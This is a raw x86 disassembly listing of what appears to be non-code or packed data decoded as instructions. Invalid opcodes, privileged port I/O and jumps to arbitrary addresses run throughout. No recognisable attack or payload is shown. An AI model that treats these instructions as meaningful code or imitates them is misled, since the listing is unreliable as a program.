  419cba:	or     BYTE PTR [edx+0xf],dh
  419cbd:	push   ebp
  419cbe:	inc    esp
  419cbf:	sbb    ch,BYTE PTR [eax-0x28]
  419cc2:	imul   ebp,DWORD PTR [eax+0x70],0xb49bab01
  419cc9:	imul   ebx,DWORD PTR [edx-0x3b],0x2a
  419ccd:	dec    ebx
  419cce:	and    al,0x33
  419cd0:	test   al,0xc2
  419cd2:	jmp    0xf0ea155a
  419cd7:	retf   0x67ab
  419cda:	aas    
  419cdb:	rol    BYTE PTR ds:0xd5653a8e,cl
  419ce1:	frstor [esp+edi*8+0x5b958c4f]
  419ce8:	icebp  
  419ce9:	sbb    bl,BYTE PTR [edi]
  419ceb:	xchg   esp,eax
  419cec:	sbb    BYTE PTR [eax],bl
  419cee:	add    eax,0xd68e4f17
  419cf3:	movnti DWORD PTR [eax-0x2c],ebx
  419cf7:	mov    esp,0x8ba9579e
  419cfc:	ret    0x30b9
  419cff:	iret   
  419d00:	push   cs
  419d01:	out    0x64,al
  419d03:	imul   eax,DWORD PTR [edi+esi*1],0x20
  419d07:	aaa    
  419d08:	cwde   
  419d09:	fld    QWORD PTR [ecx]
  419d0b:	in     al,0xa2
  419d0d:	sub    ch,dl
  419d0f:	xor    DWORD PTR [ebx+0x4],ebp
  419d12:	mov    eax,ss
  419d14:	mov    ch,0x35
  419d16:	fs jmp 0x66b1c716
  419d1c:	pop    ebp
  419d1d:	inc    esp
  419d1e:	retf   
  419d1f:	or     dl,0x36
  419d22:	popa   
  419d23:	sbb    al,0x14
  419d25:	mov    ds:0x553f369c,al
  419d2a:	test   DWORD PTR [esi-0x2d],esi
  419d2d:	imul   ecx,DWORD PTR [eax-0x18],0xffffffe0
  419d31:	rcl    BYTE PTR [edi],1
  419d33:	push   esi
  419d34:	ins    BYTE PTR es:[edi],dx
  419d35:	push   esp
  419d36:	inc    edx
  419d37:	shl    DWORD PTR ds:0xf91c9f73,0xb9
  419d3e:	(bad)  
  419d3f:	stc    
  419d40:	cwde   
	...
  419db1:	add    BYTE PTR [eax],al
  419db3:	add    BYTE PTR [esi],cl
  419db5:	bnd call 0xde7c99eb
  419dbb:	(bad)  
  419dbc:	jp     0x419e27
  419dbe:	xchg   edi,eax
  419dbf:	inc    esp
  419dc0:	adc    BYTE PTR [esi],bl
  419dc2:	(bad)
  419dc5:	sbb    BYTE PTR [ecx],al
  419dc7:	add    ch,dh
  419dc9:	add    BYTE PTR [eax],al
  419dcb:	add    bl,ah
  419dcd:	add    eax,DWORD PTR [eax+0x6fc944e6]
  419dd3:	pop    es
  419dd4:	sbb    BYTE PTR [ebx-0x386a3a91],cl
  419dda:	add    ch,BYTE PTR ds:0x4aa91f23
  419de0:	add    edx,DWORD PTR [ebp+esi*2-0x4c]
  419de4:	repnz sbb ecx,DWORD PTR [ebp+0x74181276]
  419deb:	ror    edx,cl
  419ded:	das    
  419dee:	inc    edx
  419def:	mov    ds:0xb52eda72,al
  419df4:	clc    
  419df5:	jmp    0x419d8e
  419df7:	add    eax,0x6f0d20a0
  419dfc:	mov    ch,0xc3
  419dfe:	je     0x419d92
  419e00:	or     dl,BYTE PTR ds:0xd2601ae2
  419e06:	dec    edi
  419e07:	xor    eax,DWORD PTR [edx-0x6352db4b]
  419e0d:	(bad)  
  419e0e:	lock mov dl,BYTE PTR [edi]
  419e11:	xor    eax,0x58601fbe
  419e16:	ror    esp,0x49
  419e19:	lahf   
  419e1a:	fdiv   st,st(3)
  419e1c:	push   ecx
  419e1d:	loop   0x419e2c
  419e1f:	js     0x419e6d
  419e21:	jns    0x419e46
  419e23:	xchg   ebx,eax
  419e24:	and    bh,BYTE PTR [ecx+ecx*1+0x16]
  419e28:	rcr    dh,cl
  419e2a:	rcl    ah,1
  419e2c:	(bad)  
  419e2d:	fwait
  419e2e:	xor    dh,BYTE PTR [eax-0x33]
  419e31:	pop    eax
  419e32:	jg     0x419e84
  419e34:	push   esp
  419e35:	pop    esp
  419e36:	sbb    ah,cl
  419e38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e39:	xchg   esi,eax
  419e3a:	mov    ebp,0xb52eac61
  419e3f:	jns    0x419dd0
  419e41:	dec    ecx
  419e42:	pusha  
  419e43:	xchg   ecx,eax
  419e44:	mov    ecx,0x62da153d
  419e49:	cdq    
  419e4a:	retf   
  419e4b:	dec    esp
  419e4c:	rcr    DWORD PTR [ebp+ebx*2+0x65],cl
  419e50:	xor    BYTE PTR [edi+0x4abaf19e],ah
  419e56:	rol    BYTE PTR [edi+eiz*4-0x587c5b8b],0x7e
  419e5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e5f:	shr    DWORD PTR [ebx+ebx*1-0x6d3564],cl
  419e66:	pop    es
  419e67:	ins    BYTE PTR es:[edi],dx
  419e68:	pop    ds
  419e69:	cmp    BYTE PTR [ebx],dl
  419e6b:	lahf   
  419e6c:	popf   
  419e6d:	push   ebp
  419e6e:	ds inc ebx
  419e70:	inc    ecx
  419e71:	add    al,0x66
  419e73:	scas   al,BYTE PTR es:[edi]
  419e74:	lock arpl WORD PTR es:[edi],sp
  419e78:	adc    esp,edx
  419e7a:	out    dx,al
  419e7b:	hlt    
  419e7c:	jg     0x419ed2
  419e7e:	push   eax
  419e7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e80:	fadd   DWORD PTR [edi]
  419e82:	jae    0x419eba
  419e84:	push   0xac4d26ed
  419e89:	sbb    ch,BYTE PTR [eax]
  419e8b:	jne    0x419e4b
  419e8d:	mov    BYTE PTR [ebp+0x4ddae3f],0x84
  419e94:	enter  0xbcb3,0xec
  419e98:	add    dl,0xf8
  419e9b:	push   eax
  419e9c:	jae    0x419edc
  419e9e:	and    eax,0xf8a4bf65
  419ea3:	mov    dl,0xea
  419ea5:	mov    BYTE PTR [ebx],dl
  419ea7:	and    al,cl
  419ea9:	xchg   esi,eax
  419eaa:	inc    edi
  419eab:	shl    DWORD PTR [edx+ebx*2],0x3d
  419eaf:	dec    ebx
  419eb0:	popa   
  419eb1:	pop    edx
  419eb2:	mov    ss,edi
  419eb4:	cmp    DWORD PTR [eax+0x43d1c2a2],ebp
  419eba:	pop    edx
  419ebb:	loopne 0x419e58
  419ebd:	pop    ebx
  419ebe:	sub    BYTE PTR [edi-0x4a],ah
	...
  419f31:	add    BYTE PTR [eax],al
  419f33:	add    BYTE PTR [edi+edx*4],bl
  419f36:	in     al,0x47
  419f38:	out    dx,eax
  419f39:	ja     0x419efa
  419f3b:	fbstp  TBYTE PTR [ebx-0x7b61f4b7]
  419f41:	push   ebx
  419f42:	stos   DWORD PTR es:[edi],eax
  419f43:	xchg   ebp,eax
  419f44:	cmp    bl,BYTE PTR [ecx]
  419f46:	add    DWORD PTR [eax],eax
  419f48:	cmc    
  419f49:	add    BYTE PTR [eax],al
  419f4b:	add    BYTE PTR [ecx],dh
  419f4d:	out    0xa2,al
  419f4f:	daa    
  419f50:	test   al,0xb5
  419f52:	in     al,0xc6
  419f54:	jb     0x419fb8
  419f56:	ins    DWORD PTR es:[edi],dx
  419f57:	xchg   ah,cl
  419f59:	leave  
  419f5a:	test   al,0x3d
  419f5c:	sbb    BYTE PTR [ebx+ecx*2],dl
  419f5f:	jb     0x419f69
  419f61:	add    al,0xeb
  419f63:	scas   eax,DWORD PTR es:[edi]
  419f64:	mov    ah,0x6c
  419f66:	xchg   ecx,eax
  419f67:	push   esp
  419f68:	inc    esi
  419f69:	jmp    0x419f97
  419f6b:	add    eax,0xa3b82944
  419f70:	scas   eax,DWORD PTR es:[edi]
  419f71:	fmulp  st(6),st
  419f73:	ja     0x419f84
  419f75:	sbb    al,0x7a
  419f77:	push   0x62
  419f79:	adc    eax,0xa4323e73
  419f7e:	inc    edx
  419f7f:	pushf  
  419f80:	mov    dl,0xe3
  419f82:	xchg   edi,eax
  419f83:	scas   eax,DWORD PTR es:[edi]
  419f84:	sbb    ch,bh
  419f86:	inc    edx
  419f87:	ja     0x419f53
  419f89:	stc    
  419f8a:	adc    ebx,ebp
  419f8c:	fld    TBYTE PTR [edx+0x77]
  419f8f:	lods   eax,DWORD PTR ds:[esi]
  419f90:	imul   esi,DWORD PTR [esi+0x6a],0x78
  419f94:	sbb    al,0x64
  419f96:	retf   0x124d
  419f99:	fadd   QWORD PTR [eax-0xc]
  419f9c:	pop    es
  419f9d:	stc    
  419f9e:	xor    eax,0x1d3ebb43
  419fa3:	dec    edi
  419fa4:	test   eax,0xf666052e
  419fa9:	push   es
  419faa:	adc    eax,0x7f48fb32
  419faf:	(bad)  
  419fb1:	or     esp,ebx
  419fb3:	mov    dl,0x9
  419fb5:	mov    edx,0xbcce120f
  419fba:	pop    esp
  419fbb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419fbc:	mov    ecx,0xfe3e6346
  419fc1:	inc    ecx
  419fc2:	sbb    DWORD PTR [edi-0x72038d5b],edx
  419fc8:	push   ss
  419fc9:	in     eax,0x1b
  419fcb:	jge    0x419fe9
  419fcd:	xor    DWORD PTR [edx],edi
  419fcf:	jmp    0xfd5a4702
  419fd4:	es mov cl,0xb9
  419fd7:	rol    BYTE PTR [ebp+0x14],0x92
  419fdb:	cmp    DWORD PTR [eax+eax*8+0x67da34f0],ebp
  419fe2:	sub    BYTE PTR [edi],ah
  419fe4:	push   esp
  419fe5:	(bad)  
  419fe6:	iret   
  419fe7:	sbb    ebx,DWORD PTR [ecx-0x50]
  419fea:	mov    BYTE PTR [edx+0x1dc65e75],cl
  419ff0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ff1:	js     0x419f9e
  419ff3:	shr    bl,0x41
  419ff6:	out    0xe1,eax
  419ff8:	xor    al,0xd4
  419ffa:	ins    BYTE PTR es:[edi],dx
  419ffb:	add    DWORD PTR [eax-0x55],edx
  419ffe:	or     al,0x26
  41a000:	add    DWORD PTR [esi],ecx
  41a002:	imul   esi,DWORD PTR [edx+0x67],0x38afca49
  41a009:	or     edi,ecx
  41a00b:	jl     0x41a03c
  41a00d:	arpl   WORD PTR [edx],bx
  41a00f:	inc    edx
  41a010:	(bad)  
  41a011:	std    
  41a012:	sbb    ebp,DWORD PTR [ebx]
  41a014:	cmp    al,0xb1
  41a016:	cld    
  41a017:	imul   ebx,esi,0xffffffb5
  41a01a:	dec    eax
  41a01b:	sbb    bh,BYTE PTR [eax]
  41a01d:	mov    edi,0x3932a88a
  41a022:	repz cmp eax,0xc56cb50b
  41a028:	dec    esp
  41a029:	xchg   DWORD PTR [eax+0x54],edx
  41a02c:	fldcw  WORD PTR [eax+edi*1]
  41a02f:	adc    eax,0x2cb2b496
  41a034:	(bad)  
  41a035:	cld    
  41a036:	into   
  41a037:	jle    0x41a09b
  41a039:	jmp    0x419fda
  41a03b:	retf   0x8a19
  41a03e:	adc    al,0xc6
  41a040:	mov    eax,DWORD PTR [eax]
	...
  41a0b2:	add    BYTE PTR [eax],al
  41a0b4:	scas   eax,DWORD PTR es:[edi]
  41a0b5:	test   DWORD PTR [esi-0xa441be],ebx
  41a0bb:	in     eax,dx
  41a0bc:	(bad)  ds:0xed4804a2
  41a0c2:	add    BYTE PTR [edi],bh
  41a0c4:	das    
  41a0c5:	sbb    al,BYTE PTR [ecx]
  41a0c7:	add    ch,dh
  41a0c9:	add    BYTE PTR [eax],al
  41a0cb:	add    BYTE PTR [eax-0x22],bh
  41a0ce:	add    BYTE PTR [ebp-0x496ace1f],ah
  41a0d4:	or     bl,BYTE PTR [edi]
  41a0d6:	shr    DWORD PTR ds:0x57c7cc1e,0x8f
  41a0dd:	pusha  
  41a0de:	lods   eax,DWORD PTR ds:[esi]
  41a0df:	scas   al,BYTE PTR es:[edi]
  41a0e0:	in     al,dx
  41a0e1:	pop    edi
  41a0e2:	es xor al,0x4e
  41a0e5:	loope  0x41a146
  41a0e7:	jb     0x41a08e
  41a0e9:	fld    TBYTE PTR [ecx-0x5d]
  41a0ec:	dec    DWORD PTR [esi+eiz*1-0x27]
  41a0f0:	push   cs
  41a0f1:	xor    dl,dh
  41a0f3:	bound  ebp,QWORD PTR [ebx]
  41a0f5:	neg    DWORD PTR [esi]
  41a0f7:	out    dx,eax
  41a0f8:	shl    edx,1
  41a0fa:	mov    cl,0x4c
  41a0fc:	dec    esp
  41a0fd:	push   0xffffffea
  41a0ff:	das    
  41a100:	fistp  QWORD PTR [ecx+0x2]
  41a103:	sti    
  41a104:	push   es
  41a105:	cmp    al,0x9d
  41a107:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a108:	mov    cl,0xe
  41a10a:	out    0xed,al
  41a10c:	sar    al,cl
  41a10e:	mov    eax,ds:0xa2eff4ce
  41a113:	sbb    BYTE PTR [esi+0x4851f612],bl
  41a119:	arpl   WORD PTR [ecx+0x57],cx
  41a11c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a11d:	xor    eax,0x6d8ff825
  41a122:	in     eax,dx
  41a123:	dec    edx
  41a124:	call   0xc5b6:0xe1e05334
  41a12b:	push   0xffffff85
  41a12d:	pop    esi
  41a12e:	or     edi,ebp
  41a130:	and    bh,BYTE PTR [ebx]
  41a132:	mov    eax,cs
  41a134:	push   edi
  41a135:	push   eax
  41a136:	adc    eax,DWORD PTR es:[edx+0x5f9cff55]
  41a13d:	das    
  41a13e:	int    0xc8
  41a140:	and    BYTE PTR [edx+0x6d],ch
  41a143:	dec    ebx
  41a144:	mov    edi,0x76110849
  41a149:	jno    0x41a0e0
  41a14b:	scas   eax,DWORD PTR es:[edi]
  41a14c:	jae    0x41a146
  41a14e:	sbb    BYTE PTR [eax+ebx*8-0x5ac121c7],bh
  41a155:	sbb    dh,BYTE PTR gs:[edi]
  41a158:	mov    ebx,0x9ed134c1
  41a15d:	xchg   ah,al
  41a15f:	mov    edi,0x17551dfc
  41a164:	push   ss
  41a165:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a166:	(bad)  [ecx-0x60]
  41a169:	or     dh,dh
  41a16b:	inc    ebp
  41a16c:	push   eax
  41a16d:	sbb    al,0x7c
  41a16f:	adc    ah,BYTE PTR [ebp+0x7e]
  41a172:	xchg   ebx,eax
  41a173:	xchg   edx,eax
  41a174:	sbb    al,ch
  41a176:	dec    ebp
  41a177:	ret    
  41a178:	cmp    al,0xbe
  41a17a:	pop    ds
  41a17b:	xor    al,0x23
  41a17d:	out    0x32,al
  41a17f:	repz clc 
  41a181:	outs   dx,DWORD PTR ds:[esi]
  41a182:	lea    ebx,[edi-0x1f3bbbef]
  41a188:	jo     0x41a1fe
  41a18a:	mov    ecx,DWORD PTR [eax+0x1f]
  41a18d:	jne    0x41a111
  41a18f:	mov    al,0x22
  41a191:	imul   ecx,DWORD PTR [ecx-0x6c685909],0xffffffc5
  41a198:	out    0xe,eax
  41a19a:	xchg   edi,eax
  41a19b:	push   eax
  41a19c:	cmp    BYTE PTR [edx-0x32],ah
  41a19f:	push   ss
  41a1a0:	sbb    eax,0xb58df8db
  41a1a5:	jno    0x41a225
  41a1a7:	push   ss
  41a1a8:	xor    eax,0x99de3b6c
  41a1ad:	fs hlt 
  41a1af:	pop    ecx
  41a1b0:	jne    0x41a1a9
  41a1b2:	(bad)  
  41a1b3:	dec    ebx
  41a1b4:	add    BYTE PTR [ecx],cl
  41a1b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a1b7:	jb     0x41a180
  41a1b9:	adc    eax,0xc052053b
  41a1be:	loope  0x41a158
  41a1c0:	ins    BYTE PTR es:[edi],dx
	...
  41a231:	add    BYTE PTR [eax],al
  41a233:	add    BYTE PTR [eax-0xcc4519],ah
  41a239:	jg     0x41a1e4
  41a23b:	imul   DWORD PTR [esi+eiz*4]
  41a23e:	push   edi
  41a23f:	mul    BYTE PTR [edx+0x24e4a8c6]
  41a245:	sbb    eax,DWORD PTR [ecx]
  41a247:	add    ch,dh
  41a249:	add    BYTE PTR [eax],al
  41a24b:	add    BYTE PTR [ebp+0x78f2091e],bl
  41a251:	bound  ebp,QWORD PTR [ebx+esi*1+0x9757b28]
  41a258:	xlat   BYTE PTR ds:[ebx]
  41a259:	mov    fs,WORD PTR [esi]
  41a25b:	xchg   BYTE PTR [edi-0x7ab88947],bh
  41a261:	ja     0x41a258
  41a263:	adc    ebp,0xffffffca
  41a266:	xchg   ecx,eax
  41a267:	cdq    
  41a268:	cmp    eax,0xa9bec485
  41a26d:	jge    0x41a2a5
  41a26f:	gs dec eax
  41a271:	inc    eax
  41a272:	mov    ds:0xfb5ef362,eax
  41a277:	rol    esp,cl
  41a279:	or     eax,DWORD PTR [ebx-0x79430bda]
  41a27f:	cwde   
  41a280:	fdiv   DWORD PTR [ecx+0x34]
  41a283:	push   esi
  41a284:	not    DWORD PTR [esi-0x5a]
  41a287:	xchg   BYTE PTR [ebx],bl
  41a289:	pop    esi
  41a28a:	cmc    
  41a28b:	aaa    
  41a28c:	pop    edi
  41a28d:	scas   al,BYTE PTR es:[edi]
  41a28e:	sub    eax,0x6390155d
  41a293:	push   es
  41a294:	sub    ecx,DWORD PTR [ebp-0x42bd32d0]
  41a29a:	jne    0x41a2b9
  41a29c:	fninit 
  41a29e:	clc    
  41a29f:	and    esi,edx
  41a2a1:	call   0x642e7ac6
  41a2a6:	sub    BYTE PTR [ecx-0x9],ch
  41a2a9:	inc    DWORD PTR [ebp-0x5f]
  41a2ac:	adc    dl,BYTE PTR [ebp-0x10dd66f]
  41a2b2:	sbb    dh,dl
  41a2b4:	lods   al,BYTE PTR ds:[esi]
  41a2b5:	sub    eax,0x61dde4c2
  41a2ba:	add    BYTE PTR [esi+ebp*8-0x4e],ah
  41a2be:	and    ch,BYTE PTR [edx-0x435ade5e]
  41a2c4:	lods   al,BYTE PTR ds:[esi]
  41a2c5:	xor    al,0x9a
  41a2c7:	pop    ds
  41a2c8:	mov    dh,0xe7
  41a2cb:	test   al,0x15
  41a2cd:	sub    cl,BYTE PTR [ecx-0x55c83365]
  41a2d3:	mov    eax,0x93a09824
  41a2d8:	(bad)  
  41a2d9:	dec    edi
  41a2da:	and    esi,DWORD PTR [edi-0x6a76b49a]
  41a2e0:	ja     0x41a283
  41a2e2:	pop    ebx
  41a2e3:	scas   al,BYTE PTR es:[edi]
  41a2e4:	lds    esp,FWORD PTR [ebx]
  41a2e6:	test   al,0x7e
  41a2e8:	pop    ecx
  41a2e9:	in     eax,0x73
  41a2eb:	fdivr  st(2),st
  41a2ed:	push   ebx
  41a2ee:	xor    eax,0xd1af4abf
  41a2f3:	push   esp
  41a2f4:	inc    ebx
  41a2f5:	ds mov al,0xd8
  41a2f8:	jne    0x41a2bf
  41a2fa:	adc    al,0x3e
  41a2fc:	sub    ch,BYTE PTR [esi+edi*4]
  41a2ff:	jmp    0x41a2d1
  41a301:	call   0x1cbc:0xbb75439e
  41a308:	aad    0xb9
  41a30a:	stos   DWORD PTR es:[edi],eax
  41a30b:	adc    al,0x3
  41a30d:	mov    cl,0x68
  41a30f:	fst    QWORD PTR [edi]
  41a311:	jb     0x41a2c2
  41a313:	mov    dl,0x3a
  41a315:	push   0xffffffb8
  41a317:	xchg   esp,eax
  41a318:	shr    ecx,0xda
  41a31b:	or     BYTE PTR [eax],bh
  41a31d:	scas   eax,DWORD PTR es:[edi]
  41a31e:	pop    esp
  41a31f:	jmp    0x2a2cf16b
  41a324:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a325:	jno    0x41a38f
  41a327:	push   0x47
  41a329:	pusha  
  41a32a:	mov    ebp,0x3d5947cd
  41a32f:	xchg   ebx,eax
  41a330:	retf   
  41a331:	mov    bh,0xe3
  41a333:	mov    ss,WORD PTR [esi+0x5bf29b18]
  41a339:	push   edi
  41a33a:	(bad)  
  41a33b:	jnp    0x41a305
  41a33d:	jnp    0x41a3a9
  41a33f:	ror    BYTE PTR [eax+0x0],0x0
	...
  41a3b3:	add    BYTE PTR ds:0xed3a6998,bh
  41a3b9:	sti    
  41a3ba:	jg     0x41a35b
  41a3bc:	and    DWORD PTR [esi+edx*4+0x6a],ebp
  41a3c0:	fistp  DWORD PTR [edx]
  41a3c2:	pop    edi
  41a3c3:	push   0x11c19
  41a3c8:	cmc    
  41a3c9:	add    BYTE PTR [eax],al
  41a3cb:	add    BYTE PTR [ecx-0x71],ch
  41a3ce:	push   eax
  41a3cf:	(bad)  
  41a3d0:	adc    al,dh
  41a3d2:	or     esi,DWORD PTR [eax+eiz*8+0x46]
  41a3d6:	or     edi,DWORD PTR [edi+ebp*8-0x4a]
  41a3da:	fisub  DWORD PTR [ecx+0x75e8b975]
  41a3e0:	cmp    bh,BYTE PTR [edi]
  41a3e2:	jg     0x41a389
  41a3e4:	ss xchg ebp,eax
  41a3e6:	dec    ebp
  41a3e7:	add    al,cl
  41a3e9:	ins    DWORD PTR es:[edi],dx
  41a3ea:	fwait
  41a3eb:	mov    bl,0x49
  41a3ed:	test   al,0x97
  41a3ef:	aaa    
  41a3f0:	mov    esp,0x643a9e80
  41a3f5:	sahf   
  41a3f6:	dec    ecx
  41a3f7:	je     0x41a41f
  41a3f9:	xor    eax,0x33d73165
  41a3fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a3ff:	sbb    ebp,edx
  41a401:	jns    0x41a478
  41a403:	out    0x9f,al
  41a405:	mul    ch
  41a407:	push   0x54dfe80d
  41a40c:	inc    ebx
  41a40d:	adc    al,0xf8
  41a40f:	or     al,0x2e
  41a411:	ret    0xbab6
  41a414:	mov    edx,ebx
  41a416:	(bad)  
  41a417:	fadd   DWORD PTR [esi-0x30]
  41a41a:	jg     0x41a40b
  41a41c:	mov    ebx,0xd2271363
  41a421:	add    esi,DWORD PTR [esi-0x1bd1166b]
  41a427:	xchg   BYTE PTR [ebx+0x18cc2ff],dh
  41a42d:	mov    edi,0x1416562a
  41a432:	push   edi
  41a433:	rol    DWORD PTR [eax+0x19],cl
  41a436:	mov    ebx,0xa4d053ce
  41a43b:	xchg   DWORD PTR [ebx+0x79],esi
  41a43e:	adc    edx,edi
  41a440:	fidivr DWORD PTR [edx+0x692a2dbe]
  41a446:	add    dl,BYTE PTR [eax+0x74f941bf]
  41a44c:	mov    ecx,0xd57722a7
  41a451:	xchg   BYTE PTR [edx+0x63],dh
  41a454:	pop    ebp
  41a455:	adc    DWORD PTR [ecx+0xe],edx
  41a458:	das    
  41a459:	mov    ebx,0x66385229
  41a45e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a45f:	aam    0x15
  41a461:	and    al,BYTE PTR [ebx+0x2b]
  41a464:	dec    esp
  41a465:	jb     0x41a459
  41a467:	pop    eax
  41a468:	jno    0x41a422
  41a46a:	pop    ds
  41a46b:	in     al,0xa4
  41a46d:	fdivr  QWORD PTR [esi-0x418bf0a6]
  41a473:	repnz rcl dl,cl
  41a476:	mov    ebx,0xbbb1cc6b
  41a47b:	jle    0x41a4b4
  41a47d:	adc    al,0x2c
  41a47f:	fbstp  TBYTE PTR [esi]
  41a481:	hlt    
  41a482:	fs call 0xb2ecd247
  41a488:	sub    eax,0xe4201a20
  41a48d:	cld    
  41a48e:	push   cs
  41a48f:	adc    al,0xb
  41a491:	and    dl,bl
  41a493:	test   DWORD PTR [esi-0x7b],ebx
  41a496:	xor    al,0x4
  41a498:	into   
  41a499:	or     ebx,DWORD PTR [bx+si]
  41a49c:	or     ebp,DWORD PTR ss:[ebx]
  41a49f:	mov    ebp,0xc79531b1
  41a4a4:	xchg   ebp,eax
  41a4a5:	inc    ebx
  41a4a6:	xchg   ecx,eax
  41a4a7:	and    BYTE PTR [edi],bl
  41a4a9:	js     0x41a4cc
  41a4ab:	enter  0x534e,0x7e
  41a4af:	mov    ds:0xfdb21ec,eax
  41a4b4:	pop    ebp
  41a4b5:	jae    0x41a4ac
  41a4b7:	adc    al,0xc0
  41a4b9:	inc    eax
  41a4ba:	es dec eax
  41a4bc:	mov    gs,esi
  41a4be:	and    bl,BYTE PTR [edi]
	...
  41a534:	scas   eax,DWORD PTR es:[edi]
  41a535:	aam    0x8d
  41a537:	(bad)  
  41a538:	(bad)  
  41a539:	jnp    0x41a52a
  41a53b:	fld    QWORD PTR [eax-0x22161f56]
  41a541:	lea    edx,gs:[ebx]
  41a544:	push   cs
  41a545:	sbb    eax,0xf50001
  41a54a:	add    BYTE PTR [eax],al
  41a54c:	or     eax,0x8177c65f
  41a551:	add    BYTE PTR [edx-0x15978640],ah
  41a557:	sub    eax,0x71e62a61
  41a55c:	pop    DWORD PTR [ebx+0x7e]
  41a55f:	jno    0x41a50c
  41a561:	jbe    0x41a5df
  41a563:	ins    DWORD PTR es:[edi],dx
  41a564:	or     DWORD PTR [ebx],edx
  41a566:	sub    bl,BYTE PTR [edx+0x95b0ee2]
  41a56c:	hlt    
  41a56d:	into   
  41a56e:	add    eax,0x8b238edf
  41a573:	aam    0x27
  41a575:	sti    
  41a576:	jecxz  0x41a58c
  41a578:	inc    eax
  41a579:	pusha  
  41a57a:	or     al,ch
  41a57c:	pushf  
  41a57d:	aad    0x21
  41a57f:	dec    edi
  41a580:	loopne 0x41a520
  41a582:	pop    es
  41a583:	not    BYTE PTR [ebx+0x7b]
  41a586:	pop    edi
  41a587:	mov    eax,ds:0x717a19e4
  41a58c:	into   
  41a58d:	or     bh,BYTE PTR [ebx-0x4318f54f]
  41a593:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a594:	enter  0x970c,0x6c
  41a598:	xor    ch,ch
  41a59a:	and    ecx,DWORD PTR [esi-0x161e0d2b]
  41a5a0:	enter  0xf3bf,0x3e
  41a5a4:	push   esp
  41a5a5:	or     al,0x35
  41a5a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a5a8:	out    0x75,al
  41a5aa:	bnd jle 0x41a57d
  41a5ad:	iret   
  41a5ae:	sub    eax,0x700c34f5
  41a5b3:	inc    edx
  41a5b4:	mov    eax,ds:0xf7be68e2
  41a5b9:	dec    edi
  41a5ba:	push   0xbeb928cd
  41a5bf:	pop    ebp
  41a5c0:	mov    ch,0x7f
  41a5c2:	mov    WORD PTR [esi],ss
  41a5c4:	je     0x41a613
  41a5c6:	push   esi
  41a5c7:	pop    eax
  41a5c8:	shl    dh,1
  41a5ca:	jb     0x41a568
  41a5cc:	pop    esi
  41a5cd:	pop    esi
  41a5ce:	push   es
  41a5cf:	or     al,0x2e
  41a5d1:	dec    edx
  41a5d2:	icebp  
  41a5d3:	mov    dl,0x14
  41a5d6:	out    0x92,eax
  41a5d8:	dec    edi
  41a5d9:	fcmovb st,st(7)
  41a5db:	dec    edi
  41a5dc:	and    esi,DWORD PTR [ebx]
  41a5de:	stos   DWORD PTR es:[edi],eax
  41a5df:	(bad)  
  41a5e0:	aad    0x5e
  41a5e2:	dec    edi
  41a5e3:	or     DWORD PTR [edx],ebx
  41a5e5:	push   edi
  41a5e6:	dec    esi
  41a5e7:	dec    esi
  41a5e8:	sub    eax,0xf16d8b49
  41a5ed:	xchg   edx,eax
  41a5ee:	das    
  41a5ef:	je     0x41a5ff
  41a5f1:	or     DWORD PTR [edx+0x2790e3cd],eax
  41a5f7:	fistp  QWORD PTR [ecx-0x36]
  41a5fa:	stos   DWORD PTR es:[edi],eax
  41a5fb:	pop    esp
  41a5fc:	add    BYTE PTR [edi-0x52],dh
  41a5ff:	cmc    
  41a600:	adc    bl,BYTE PTR [eax-0x600ea4c5]
  41a606:	adc    eax,0x77c9f72f
  41a60b:	enter  0x5995,0x93
  41a60f:	add    DWORD PTR [edi],esi
  41a611:	inc    eax
  41a612:	dec    edi
  41a613:	xchg   ebp,eax
  41a614:	mov    esi,0xed2833ba
  41a619:	sub    al,0xb4
  41a61c:	fst    QWORD PTR [ecx+0x5370fbc3]
  41a622:	jmp    0x41a5bb
  41a624:	fbstp  TBYTE PTR [eax]
  41a626:	pop    eax
  41a627:	aam    0xf8
  41a629:	jo     0x41a5b0
  41a62b:	sbb    esi,DWORD PTR [ecx+0x8]
  41a62e:	retf   
  41a62f:	xor    BYTE PTR [esi-0x47a2008],dh
  41a635:	jo     0x41a68e
  41a637:	add    DWORD PTR [eax],edi
  41a639:	mov    bh,0x57
  41a63b:	mov    dl,0xf6
  41a63d:	push   cs
  41a63e:	jno    0x41a606
  41a640:	pop    ebp
	...
  41a6b1:	add    BYTE PTR [eax],al
  41a6b3:	add    BYTE PTR [ebx-0x29a8ec1],dh
  41a6b9:	outs   dx,DWORD PTR ds:[esi]
  41a6ba:	mov    bh,0xff
  41a6bc:	xchg   ecx,eax
  41a6bd:	pop    edx
  41a6be:	cdq    
  41a6bf:	mov    dl,0x71
  41a6c1:	mov    ds:0x1e03e0a5,al
  41a6c6:	add    DWORD PTR [eax],eax
  41a6c8:	cmc    
  41a6c9:	add    BYTE PTR [eax],al
  41a6cb:	add    BYTE PTR [esi-0x68],bh
  41a6ce:	call   0x33e6:0x980e0791
  41a6d5:	push   esi
  41a6d6:	push   esp
  41a6d7:	das    
  41a6d8:	scas   eax,DWORD PTR es:[edi]
  41a6d9:	frstor [ecx-0x1038ea5a]
  41a6df:	jl     0x41a673
  41a6e1:	je     0x41a6c9
  41a6e3:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  41a6e5:	push   0x30
  41a6e7:	sti    
  41a6e8:	in     al,0x6
  41a6ea:	popa   
  41a6eb:	push   ebx
  41a6ec:	fcmovnbe st,st(0)
  41a6ee:	shl    ebp,1
  41a6f0:	xchg   ecx,ecx
  41a6f2:	mov    ebp,0x1fa69fd5
  41a6f7:	or     edi,edx
  41a6f9:	sbb    cl,BYTE PTR [esp+esi*8-0x5356d082]
  41a700:	pop    edi
  41a701:	(bad)  
  41a702:	mov    ch,0xfd
